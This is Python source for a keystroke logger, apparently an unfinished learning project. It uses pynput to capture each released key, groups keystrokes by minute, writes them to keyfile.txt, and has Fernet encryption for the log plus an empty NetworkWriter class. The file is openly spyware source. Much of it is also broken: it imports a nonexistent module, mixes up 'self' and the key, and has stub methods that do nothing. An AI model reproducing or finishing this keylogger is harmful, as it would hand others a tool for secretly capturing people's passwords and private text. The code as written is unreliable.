import time, os
from pynput import keyboard
from cryptography.fernet import Fernet
from requests import request
import json
from PythonProject import requests

class KeyLoggerService:
    def __init__(self):
        self.global_log = []
        self.log_l = {}
        self.long_str = ""

    def get_time(self):
        """Get The time by Minutes"""
        formatted_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
        return formatted_time

    def make_long_str(self,key):
        """Makes a long str to chek the last characters"""
        if hasattr(self, 'char') and key:
            self.long_str += key

    def make_dict(self,key):
        """Making The directory of the log"""
        now = self.get_time()
        if f"{now}" in self.log_l:
            self.log_l[f"{now}"].append(key)
        else:
            self.log_l[f"{now}"] = [key]

class KeyLoggerManager:
    def __init__(self, service, writer):
        self.log_l = None
        self.Key = None
        self.global_log = None
        self.str_l = None
        self.service = service
        self.writer = writer

    def key_for_log(self,key):
        """Loging Every key to all the function needed"""
        self.make_long_str(self)
        self.make_dict(self)
        if self.str_l[-4:] == "exit":
            print("Detected 'exit' key:", list(self.str_l))
            self.str_l = ""
        elif self == self.Key.space:
            self.global_log.append(self.log_l)
            self.log_l = {}
        elif self == self.Key.esc:
            self.global_log.append(self.log_l)
            for i in self.global_log:
                for j in i:
                    print(f"{j}\n{i[j]} ")
            self.outing_to_file(self.global_log)
            return False
        return None

    def starting_listening(self):
        """Start listening"""
        self.log_l = {}
        self.str_l = ""
        with keyboard.Listener(on_release=self.key_for_log) as listener:
            listener.join()

    def make_long_str(self, self1):
        pass

    def make_dict(self, self1):
        pass

    def outing_to_file(self, global_log):
        pass

class FileWriter:
    def outing_to_file(self, grouped):
        with open("keyfile.txt", "a", encoding="utf-8") as f:
            for minute, items in grouped.items():
                f.write(minute + "\n")
                for t in items:
                    f.write(str(t) + "\n")

class Encryptor:
    def __init__(self):
        self.output_filename = None
        self.key = None
        self.original = self
        self.encrypted = self
        self.decrypted = self

    def encrypt_file(self, output_filename, key):
        f = Fernet(key)
        with open(self.output_filename, 'rb') as file:
            data = file.read()
        enc = f.encrypt(data)
        with open(output_filename, 'wb') as file:
            file.write(enc)

    def decrypt_file(self, output_filename, key):
        f = Fernet(key)
        with open(self.output_filename, 'rb') as file:
            data = file.read()
        dec = f.decrypt(data)
        with open(output_filename, 'wb') as file:
            file.write(dec)

    def make_key(self):
        if not os.path.exists("key.key"):
            key = Fernet.generate_key()
            with open("key.key", "wb") as f:
                f.write(key)
        else:
            with open("key.key", "rb") as f:
                key = f.read()
        print("Key:", self.key.decode())

class NetworkWriter:
    pass
